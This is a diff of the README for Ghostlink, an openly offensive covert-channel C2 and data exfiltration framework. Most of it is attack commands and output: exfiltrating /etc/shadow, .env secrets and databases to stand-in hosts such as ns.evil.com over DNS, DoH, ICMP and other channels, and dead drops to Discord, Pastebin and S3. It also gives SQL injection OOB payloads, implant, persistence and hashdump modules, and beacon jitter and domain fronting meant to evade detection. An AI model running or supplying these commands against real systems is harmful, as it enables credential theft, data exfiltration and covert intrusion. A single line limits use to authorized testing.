@@ -1,14 +1,24 @@
 # Ghostlink
 
-**Adaptive multi-channel C2 framework with 9 covert channels, ECDHE key exchange, and AES-256-GCM encryption.**
+**Multi-channel OOB data exfiltration framework — 9 covert channels, FEC, dead drops, SQLi payloads, and optional C2.**
 
 [![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
 [![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
 [![Channels](https://img.shields.io/badge/covert_channels-9-green)]()
 [![Encryption](https://img.shields.io/badge/crypto-ECDHE%20%7C%20AES--256--GCM-red)]()
-[![Version](https://img.shields.io/badge/version-0.8-orange)]()
+[![Version](https://img.shields.io/badge/version-1.0-orange)]()
 
-Ghostlink tunnels encrypted C2 traffic through 9 protocols that DPI, IDS, and firewalls typically ignore. It adaptively scores channels by entropy and latency, rotates between them for diversity, and fails over automatically when a channel is disrupted.
+Ghostlink is **not a general-purpose C2**. It's a surgical tool for **getting data out when every other path is blocked**. If Sliver and Cobalt Strike are the army, Ghostlink is the scalpel — specializing in environments monitored by DPI, IDS, and strict firewalls where traditional C2 traffic gets flagged instantly.
+
+---
+
+## Three modes, one tool
+
+| Mode | Purpose | Command |
+|---|---|---|
+| **Exfil** | Fire-and-forget data exfiltration via 9 covert channels | `-exfil`, `-exfil-glob` |
+| **Dead Drop** | Exfiltrate to 3rd-party services (no C2 server needed) | `-dead-drop` |
+| **C2** | Interactive shell, SOCKS5, port forwarding, modules | `-shell`, `-exec`, `-socks` |
 
 ---
 
@@ -24,6 +34,11 @@ plaintext ──>│ AES-256-GCM  │                        │ AES-256-GCM  �
              ┌──────v───────┐                        ┌──────┴───────┐
              │    zlib      │                        │    zlib      │
              │  compress    │                        │  decompress  │
+             └──────┬───────┘                        └──────^───────┘
+                    │                                       │
+             ┌──────v───────┐                        ┌──────┴───────┐
+             │ FEC encode   │                        │  FEC decode  │
+             │ (XOR parity) │                        │ (reassemble) │
              └──────┬───────┘                        └──────^───────┘
                     │                                       │
              ┌──────v───────┐                        ┌──────┴─────────┐
@@ -44,17 +59,17 @@ plaintext ──>│ AES-256-GCM  │                        │ AES-256-GCM  �
 
 ## Covert Channels
 
-| # | Channel | Flag | Technique | Stealth | Root | Throughput |
-|---|---------|------|-----------|:-------:|:----:|:----------:|
-| 1 | **DNS** | `-channel dns` | TXT query tunneling, base64 labels | 0.85 | -- | High |
-| 2 | **DoH** | `-channel doh` | DNS-over-HTTPS (RFC 8484), bypasses DNS monitoring | 0.96 | -- | High |
-| 3 | **HTTP** | `-channel http` | Cookie/User-Agent header smuggling, browser emulation | 0.90 | -- | High |
-| 4 | **WebSocket** | `-channel websocket` | Persistent bidirectional tunnel, blends with web apps | 0.92 | -- | High |
-| 5 | **ICMP** | `-channel icmp` | Echo request/reply payload embedding | 0.75 | Yes | High |
-| 6 | **TCP ISN** | `-channel tcp_isn` | Initial Sequence Number steganography (2 bytes/SYN) | 0.70 | Yes | Low |
-| 7 | **IP ID** | `-channel ip_id` | IPv4 Identification field modulation (2 bytes/pkt) | 0.72 | Yes | Low |
-| 8 | **Timing** | `-channel timing` | Inter-packet delay encoding (bit0=50ms, bit1=150ms) | 0.95 | -- | ~40 bps |
-| 9 | **Packet-size** | `-channel packet_size` | Payload size modulation (3 bits/pkt) | 0.80 | -- | ~300 bps |
+| # | Channel | Flag | Technique | Stealth | Throughput |
+|---|---------|------|-----------|---------|------------|
+| 1 | **DNS** | `-channel dns` | TXT query tunneling, base64 labels | 0.85 | High |
+| 2 | **DoH** | `-channel doh` | DNS-over-HTTPS (RFC 8484), bypasses DNS monitoring | 0.96 | High |
+| 3 | **HTTP** | `-channel http` | Cookie/User-Agent header smuggling, browser emulation | 0.90 | High |
+| 4 | **WebSocket** | `-channel websocket` | Persistent bidirectional tunnel, blends with web apps | 0.92 | High |
+| 5 | **ICMP** | `-channel icmp` | Echo request/reply payload embedding | 0.75 | High |
+| 6 | **TCP ISN** | `-channel tcp_isn` | Initial Sequence Number steganography (2 bytes/SYN) | 0.70 | Low |
+| 7 | **IP ID** | `-channel ip_id` | IPv4 Identification field modulation (2 bytes/pkt) | 0.72 | Low |
+| 8 | **Timing** | `-channel timing` | Inter-packet delay encoding (bit0=50ms, bit1=150ms) | 0.95 | ~40 bps |
+| 9 | **Packet-size** | `-channel packet_size` | Payload size modulation (3 bits/pkt) | 0.80 | ~300 bps |
 
 ---
 
@@ -66,356 +81,302 @@ go build -o ghostlink-server ./cmd/server
 go build -o ghostlink-client ./cmd/client
 ```
 
-**Execute a command over encrypted DNS:**
+---
+
+## Exfiltration (Primary Use Case)
+
+### Fire-and-forget file exfiltration
+Sends a file and exits. No shell, no session, just data out.
 
 ```bash
 # Server
-./ghostlink-server -channel dns -addr 0.0.0.0:5353 -key "op"
+./ghostlink-server -channel dns -addr 0.0.0.0:5353 -key op
 
-# Client
-./ghostlink-client -channel dns -addr 10.0.0.5:5353 -key "op" \
-  -exec "cat /etc/passwd; netstat -tlnp"
+# Client — single file
+./ghostlink-client -channel dns -addr 10.0.0.5:5353 -key op -exfil /etc/shadow
+
+# Server output:
+# [exfil] received shadow (1024 bytes) -> ./exfiltrated/shadow_1 [sha256:a1b2c3d4]
+```
+
+### Glob-based exfiltration with content filtering
+```bash
+# Exfiltrate all .env files, keep only lines matching API_KEY or SECRET
+./ghostlink-client -channel http -addr C2:8080 -ecdhe \
+  -exfil-glob "/var/www/**/*.env" \
+  -exfil-filter "API_KEY|SECRET|DATABASE_URL"
+
+# Exfiltrate all configs under 1MB
+./ghostlink-client -channel doh \
+  -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
+  -ecdhe -exfil-glob "/etc/**/*.conf" -exfil-max 1048576
+```
+
+### Multi-path exfiltration with Forward Error Correction
+Split a single file across N channels in parallel. Losing any single channel doesn't lose data.
+
+```bash
+# Uses FEC (8 data + 3 parity shards). Even if 3 channels are blocked, data survives.
+./ghostlink-client -multi-path dns,http,icmp,websocket \
+  -addr C2:5353 -key op -multi-path-fec -exfil large_db.sql
+```
+
+### Dead drop exfiltration (zero C2 infrastructure)
+Exfiltrate to public services without a C2 server.
+
+```bash
+# Discord webhook
+./ghostlink-client -dead-drop discord \
+  -dead-drop-url "https://discord.com/api/webhooks/xxx/yyy" \
+  -exfil /etc/shadow
+
+# Generic webhook
+./ghostlink-client -dead-drop webhook \
+  -dead-drop-url "https://your-server.com/collect" \
+  -exfil-glob "/var/www/**/*.env"
+
+# Pastebin
+./ghostlink-client -dead-drop pastebin \
+  -dead-drop-url "https://pastebin.com/api/api_post.php" \
+  -dead-drop-key "YOUR_PASTEBIN_API_KEY" \
+  -exfil /tmp/sensitive.txt
+
+# S3
+./ghostlink-client -dead-drop s3 \
+  -dead-drop-bucket "backup-logs" \
+  -dead-drop-region "us-east-1" \
+  -dead-drop-key "AKIAXXX:secret" \
+  -exfil /var/log/auth.log
 ```
 
 ---
 
-## Encryption
+## SQLi OOB Payload Generator
 
-| Mode | Flag | Description |
-|------|------|-------------|
-| **ECDHE** | `-ecdhe` | P-256 key exchange per session. Forward secrecy. No pre-shared secret needed. |
-| **PSK** | `-key <pass>` | SHA-256 derived key. AES-256-GCM with random 12-byte nonce per message. |
-| **Plain** | _(default)_ | No encryption. Raw covert channel only. |
+Generate SQL injection payloads for DNS/HTTP OOB data exfiltration. Supports MySQL, MSSQL, Oracle, PostgreSQL.
+
+```bash
+# Server-side generation
+./ghostlink-server -channel dns -addr 0.0.0.0:5353
+
+# In the c2 console:
+c2> sqli mysql ns.evil.com "SELECT password FROM mysql.user LIMIT 1"
+
+=== MySQL DNS OOB Payloads === (domain: ns.evil.com)
+
+# Method 1: LOAD_FILE (requires FILE privilege, Windows UNC path)
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM mysql.user LIMIT 1), '.ns.evil.com\\a'));
+
+# Method 2: Extract all tables
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), '.ns.evil.com\\a'));
+```
 
 ---
 
-## Usage
+## C2 Features (Interactive Mode)
 
-### Authoritative DNS Mode (firewall bypass)
-
-Tunnels through the real DNS hierarchy. Works even behind corporate firewalls that only allow internal DNS.
+### Authoritative DNS Mode
+Tunnels through the real DNS hierarchy. Works behind corporate firewalls that only allow internal DNS.
 
 ```bash
-# C2 server (authoritative NS for ns.example.com)
+# C2 server (authoritative NS)
 sudo ./ghostlink-server -domain ns.example.com -addr 0.0.0.0:53
 
 # Implant
 ./ghostlink-client -domain ns.example.com -exec "whoami; hostname"
 ```
 
-```
-IMPLANT --> INTERNAL DNS --> FIREWALL --> ROOT/TLD --> AUTHORITATIVE NS (Ghostlink) --> C2
-```
+### Encryption
+| Mode | Flag | Description |
+|---|---|---|
+| **ECDHE** | `-ecdhe` | P-256 key exchange per session. Forward secrecy. |
+| **PSK** | `-key <pass>` | SHA-256 derived key. AES-256-GCM with random 12-byte nonce per message. |
+| **Plain** | *(default)* | No encryption. Raw covert channel only. |
 
 ### DNS-over-HTTPS (bypass DNS monitoring)
-
-All DNS traffic goes over HTTPS. Completely invisible to DNS-based monitoring, DPI, and firewall inspection.
-
 ```bash
-# Direct mode
-./ghostlink-server -channel doh -addr 0.0.0.0:443 -key "op"
-./ghostlink-client -channel doh -addr http://C2_IP:443 -key "op" -exec "whoami"
+./ghostlink-server -channel doh -addr 0.0.0.0:443 -ecdhe
+./ghostlink-client -channel doh -addr http://C2:443 -ecdhe -exec "whoami"
 
-# Via public resolver (traffic looks like normal Cloudflare DoH)
+# Via Cloudflare (traffic looks like normal DoH)
 ./ghostlink-client -channel doh \
   -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
-  -exec "cat /etc/shadow"
-```
-
-### WebSocket Channel
-
-Persistent bidirectional connection that blends with modern web application traffic.
-
-```bash
-./ghostlink-server -channel websocket -addr 0.0.0.0:8443 -ecdhe
-./ghostlink-client -channel websocket -addr 127.0.0.1:8443 -ecdhe \
-  -exec "id; uname -a"
+  -ecdhe -exec "cat /etc/shadow"
 ```
 
 ### SOCKS5 Proxy
-
-Tunnel all TCP traffic through any covert channel. Use with `proxychains`, `curl --socks5`, or any SOCKS-aware tool.
-
 ```bash
-# C2 server
-./ghostlink-server -channel http -addr 0.0.0.0:8080 -ecdhe
+./ghostlink-server -channel websocket -addr 0.0.0.0:8443 -ecdhe
+./ghostlink-client -channel websocket -addr C2:8443 -ecdhe -socks 1080
 
-# Client starts SOCKS5 on port 1080
-./ghostlink-client -channel http -addr C2:8080 -ecdhe -socks 1080
-
-# Route traffic through the tunnel
 curl --socks5 127.0.0.1:1080 http://internal.corp:8080/admin
 proxychains nmap -sT -Pn 10.10.10.0/24
 ```
 
 ### Multi-Channel Hopping
-
-Rotate between channels automatically every 30 seconds. Automatic failover if a channel drops.
-
 ```bash
 ./ghostlink-client -hop dns,http,websocket -addr C2:5353 -ecdhe
 # [hop] dns -> http -> websocket -> dns (30s rotation)
 ```
 
 ### Domain Fronting
-
-Use a CDN domain as TLS SNI to disguise HTTP channel traffic.
-
 ```bash
-./ghostlink-client -channel http -addr C2:443 -ecdhe \
-  -front ajax.googleapis.com
+./ghostlink-client -channel http -addr C2:443 -ecdhe -front ajax.googleapis.com
 ```
 
-### Port Forwarding
+### Canary / Tripwire Mode
+Detects channel disruption and auto-responds.
 
 ```bash
-# Tunnel RDP through DNS
-./ghostlink-client -channel dns -addr C2:5353 -key piv \
-  -forward 1080:10.10.10.50:3389
+./ghostlink-client -channel dns -addr C2:5353 -key op -canary -exfil /etc/shadow
 
-# Connect from operator machine
-rdesktop 127.0.0.1:1080
+# If DNS monitoring blocks the channel:
+# [canary] channel degraded — switching to backup
+# [canary] channel silent — silencing for 24h
+# [canary] channel dead
 ```
 
-### Interactive Shell
-
-```bash
-./ghostlink-server -channel dns -addr 0.0.0.0:16353 -ecdhe
-./ghostlink-client -channel dns -addr C2:16353 -ecdhe -shell
-```
-
----
-
-## Beacon Jitter Profiles
-
-Control implant timing to avoid detection by behavioral analysis.
-
-| Profile | Flag | Interval | Behavior |
-|---------|------|----------|----------|
-| **Low & Slow** | `-jitter low_slow` | 2--10 min | Long intervals, 50% jitter. Hardest to detect. |
-| **Office Day** | `-jitter office` | 10--90s | Active during 8AM--6PM, 3x slower at night/weekends. |
-| **Night** | `-jitter night` | 5--30 min | Optimized for off-hours operations. |
-| **Burst** | `-jitter burst` | 0.5--5s | 5 rapid pings, then 2 min pause. |
-| **Random** | `-jitter random` | 5s--5 min | Maximally unpredictable, 90% jitter factor. |
-
+### Beacon Jitter Profiles
 ```bash
 ./ghostlink-client -channel http -addr C2:8080 -ecdhe -jitter office
+./ghostlink-client -channel doh -addr C2:443 -ecdhe \
+  -jitter low_slow -reconnect -retries 50
 ```
 
----
-
-## Session Persistence
-
-Auto-reconnect on connection loss with exponential backoff (5s, 10s, 15s... up to 60s cap).
+### Session Persistence
+Auto-reconnect with exponential backoff.
 
 ```bash
-./ghostlink-client -channel dns -addr C2:5353 -key op \
-  -reconnect -retries 20 -shell
+./ghostlink-client -channel dns -addr C2:5353 -key op -reconnect -retries 20 -shell
 ```
 
----
-
-## Multi-Session C2
-
-The server tracks all connected implants. Switch between sessions, send commands, or kill sessions from the interactive console.
-
+### Multi-Session C2 Console
 ```
-ghostlink c2 v0.8 | dns | 0.0.0.0:5353 | PSK | proto v2
+ghostlink v1.0 | dns | 0.0.0.0:5353 | PSK | proto v2
 [*] waiting for connections...
 [+] session from 10.0.0.5:42891
 [+] session #1 registered
-[+] session from 10.0.0.8:33012
-[+] session #2 registered
 
 c2> sessions
-[*] 2 active session(s):
-  * #1 -- 10.0.0.5:42891
-    #2 -- 10.0.0.8:33012
-
-c2> use 2
-[*] active session: #2
+[*] 1 active session(s):
+  * #1 — 10.0.0.5:42891
 
 c2> exec whoami
-[*] command sent to session #2: whoami
+[*] command sent to session #1: whoami
 [result] root
 
-c2> kill 1
-[*] session #1 killed
+c2> exfils
+[*] 2 exfiltrated files:
+  shadow_1 (1024 bytes)
+  .env_1 (512 bytes)
+
+c2> sqli mysql ns.evil.com "SELECT password FROM mysql.user LIMIT 1"
 ```
 
-**Server commands:**
-
-| Command | Description |
-|---------|-------------|
-| `sessions` / `list` | List all active sessions |
-| `use <id>` | Switch active session |
-| `kill <id>` | Terminate a session |
-| `exec <cmd>` | Execute command on active session |
-| `shell` | Spawn interactive shell |
-| `upload <local> <remote>` | Upload file to implant |
-| `download <remote>` | Download file from implant |
-| `ping` | Heartbeat check |
+**Server commands:** `sessions`, `use <id>`, `kill <id>`, `exec <cmd>`, `shell`, `upload`, `download`, `ping`, `modules`, `run`, `sqli`, `exfils`, `help`
 
 ---
 
-## DNS Reconnaissance
+## Proof of Exfil
 
-Probe the network's DNS configuration before choosing a tunneling strategy.
+Every exfiltrated file receives a SHA-256 acknowledgement:
+
+```
+[exfil] received shadow (1024 bytes) -> ./exfiltrated/shadow_1 [sha256:a1b2c3d4]
+```
+
+The implant receives: `[exfil] server ack: OK:shadow:a1b2c3d4`
+
+---
+
+## Forward Error Correction
+
+Packets lost over UDP-based channels (DNS, ICMP, IP ID, timing) don't corrupt data. XOR-based parity shards enable full data reconstruction.
+
+- 4KB data → 4 data + 2 parity shards (33% redundancy, tolerates 2 lost shards)
+- 100KB data → 12 data + 4 parity shards (33% redundancy, tolerates 4 lost shards)
+- Auto-tuned by data size
+
+---
+
+## Post-Exploitation Modules
+
+8 built-in modules: `sysinfo`, `portscan`, `ps`, `netstat`, `env`, `screenshot`, `persist`, `hashdump`
 
 ```bash
-./ghostlink-client -dns-recon
-```
-
-```
-=== Ghostlink DNS Reconnaissance ===
-
-[*] Resolver: System DNS
-    Internal (acme.local)          + resolved
-    External (google.com)          + resolved
-[*] Resolver: Google
-    Direct external DNS            + reachable (external DNS allowed)
-
-[*] Record type availability (via 8.8.8.8):
-    A      + allowed
-    TXT    + allowed
-    CNAME  + allowed
-    MX     + allowed
-
-[*] Recommendations:
-    External DNS direct access:  YES -- use -channel dns (direct mode)
-    TXT records allowed:         YES -- standard DNS tunneling works
-    Recommended channel:         dns (direct)
+c2> run sysinfo
+c2> run portscan 10.10.10.0/24 22,80,443,3389
+c2> run persist cron /tmp/implant
 ```
 
 ---
 
 ## C Implant
 
-Lightweight C implant (~30KB compiled) with zero dependencies. Supports DNS and HTTP channels.
+Lightweight C implant (~30KB compiled) with zero dependencies.
 
 ```bash
-# Build
 gcc -Os -s -o ghostimpl implant/ghostimpl.c
-
-# Cross-compile for Windows
-x86_64-w64-mingw32-gcc -Os -s -o ghostimpl.exe implant/ghostimpl.c -lws2_32
-```
-
-```bash
-# DNS mode
 ./ghostimpl dns 10.0.0.5 53 ns.evil.com "whoami"
-
-# HTTP mode
-./ghostimpl http 10.0.0.5 8080 "cat /etc/passwd"
 ```
 
 ---
 
-## sqlmap Bridge
-
-Dedicated bridge for capturing sqlmap DNS exfiltration data.
+## DNS Reconnaissance
 
 ```bash
-go build -o ghostlink-bridge ./bridge
-sudo ./ghostlink-bridge -addr 0.0.0.0:53 -output exfiltrated.txt
-
-# Run sqlmap with DNS exfil
-sqlmap -u "https://target.com/page.php?id=1" \
-  --dns-domain=attacker.com -D db -T users -C password --dump
+./ghostlink-client -dns-recon
 ```
 
-Output:
-```
-[16:55:44] [10.0.0.5] admin:secret123
-[16:55:45] [10.0.0.5] root:$6$salt$hash
-```
-
----
-
-## Red Team Scenarios
-
-### SQL injection to DNS exfiltration
-
-```bash
-sudo ./ghostlink-server -domain ns.evil.com -addr 0.0.0.0:53
-```
-
-```sql
-' UNION SELECT LOAD_FILE(CONCAT("\\\\",
-  (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
-   WHERE table_schema=DATABASE()),
-  ".ns.evil.com\\a")) --
-```
-
-Zero outbound TCP from the target. Data flows through the DNS hierarchy to your authoritative server.
-
-### Post-exploitation C2 over ICMP
-
-```bash
-sudo ./ghostlink-server -channel icmp -addr 0.0.0.0 -ecdhe
-sudo ./ghostlink-client -channel icmp -addr 10.0.0.5 -ecdhe \
-  -exec "id; uname -a; ifconfig"
-```
-
-No TCP sockets, no listening ports on the implant.
-
-### Full tunnel through WebSocket + SOCKS5
-
-```bash
-./ghostlink-server -channel websocket -addr 0.0.0.0:8443 -ecdhe
-./ghostlink-client -channel websocket -addr C2:8443 -ecdhe -socks 1080
-
-# Scan internal network through the tunnel
-proxychains nmap -sT -Pn 10.10.10.0/24 -p 22,80,443,3389
-```
-
-### Persistent implant with jitter
-
-```bash
-./ghostlink-client -channel doh \
-  -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
-  -ecdhe -jitter low_slow -reconnect -retries 50
-```
-
-Beacons every 2--10 minutes via DoH through Cloudflare. Auto-reconnects up to 50 times. Nearly invisible.
+Probes resolver availability, record type support, and recommends the optimal channel.
 
 ---
 
 ## Comparison
 
-| | Ghostlink | dnscat2 | iodine | ptunnel | Cloak |
-|---|:---:|:---:|:---:|:---:|:---:|
-| Channels | **9** | 1 | 1 | 1 | 1 |
-| DNS | Yes | Yes | Yes | -- | -- |
-| DNS-over-HTTPS | Yes | -- | -- | -- | -- |
-| HTTP | Yes | -- | -- | -- | -- |
-| WebSocket | Yes | -- | -- | -- | -- |
-| ICMP | Yes | -- | -- | Yes | -- |
-| TCP ISN / IP ID | Yes | -- | -- | -- | -- |
-| Timing / Pkt-size | Yes | -- | -- | -- | -- |
-| SOCKS5 proxy | Yes | -- | -- | -- | -- |
-| ECDH key exchange | Yes | -- | -- | -- | -- |
-| Adaptive selection | Yes | -- | -- | -- | -- |
-| Multi-channel hop | Yes | -- | -- | -- | -- |
-| Beacon jitter | Yes | -- | -- | -- | -- |
-| Multi-session C2 | Yes | -- | -- | -- | -- |
-| Session persistence | Yes | -- | -- | -- | -- |
-| C implant | Yes | -- | -- | -- | -- |
+| | Ghostlink | Sliver | dnscat2 | Cloak |
+|---|---|---|---|---|
+| **Purpose** | OOB exfil + C2 | Full C2 platform | DNS tunnel | C2 |
+| Covert channels | **9** | 3-4 | 1 | 1 |
+| DNS-over-HTTPS | Yes | — | — | — |
+| TCP ISN / IP ID stego | **Yes** | — | — | — |
+| Timing / Pkt-size | **Yes** | — | — | — |
+| Dead drops (Discord/S3) | **Yes** | — | — | — |
+| SQLi OOB generator | **Yes** | — | — | — |
+| Multi-path + FEC | **Yes** | — | — | — |
+| Forward Error Correction | **Yes** | — | — | — |
+| Canary / tripwire | **Yes** | — | — | — |
+| Proof of Exfil (SHA-256) | **Yes** | — | — | — |
+| SOCKS5 proxy | Yes | Yes | — | — |
+| Multi-session C2 | Yes | Yes | — | — |
+| Beacon jitter profiles | 5 profiles | Built-in | — | — |
+| Domain fronting | Yes | Yes | — | Yes |
+| C implant | Yes | — | — | — |
 
 ---
 
 ## Protocol
 
-Ghostlink v0.8 uses protocol version 2 with backward compatibility for v1 messages.
+Ghostlink v1.0 uses protocol version 2:
 
 ```
 v2 message format (8 bytes header):
   [version:1][type:1][stream_id:4][payload_len:2][payload:N]
 
-v1 messages (7 bytes header, no version byte) are auto-detected and parsed.
+Message types (v1.0):
+  Shell: Stdin(0x01), Stdout(0x02), Stderr(0x03)
+  Cmd:   Req(0x04), Res(0x05)
+  File:  Put(0x06), GetReq(0x07), GetChunk(0x08)
+  Fwd:   Connect(0x10), Data(0x11), Close(0x12)
+  Socks: Connect(0x13), Data(0x14), Close(0x15)
+  Ping:  Ping(0x20), Pong(0x21)
+  Session: Reconnect(0x30), ID(0x31)
+  Module: List(0x40), Exec(0x41), Result(0x42)
+  Exfil: File(0x50), Glob(0x51), Ack(0x52), Chunk(0x53)
+  DeadDrop: Send(0x54), Ack(0x55)
+  Canary: Alert(0x60), Check(0x61)
+  Error: Error(0xFF)
 ```
-
-Message types: `ShellStdin/Stdout/Stderr`, `CmdReq/Res`, `FilePut/GetReq/GetChunk`, `FwdConnect/Data/Close`, `SocksConnect/Data/Close`, `Ping/Pong`, `Reconnect`, `SessionID`, `Error`.
 
 ---
 
@@ -425,12 +386,8 @@ This tool is for **authorized red team assessments, penetration testing, and sec
 
 ## License
 
-MIT -- see [LICENSE](LICENSE)
+MIT — see [LICENSE](LICENSE)
 
 ---
 
-<div align="center">
-
 [![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-sevbandonmez-FFDD00?style=flat&logo=buymeacoffee&logoColor=black)](https://www.buymeacoffee.com/sevbandonmez)
-
-</div>
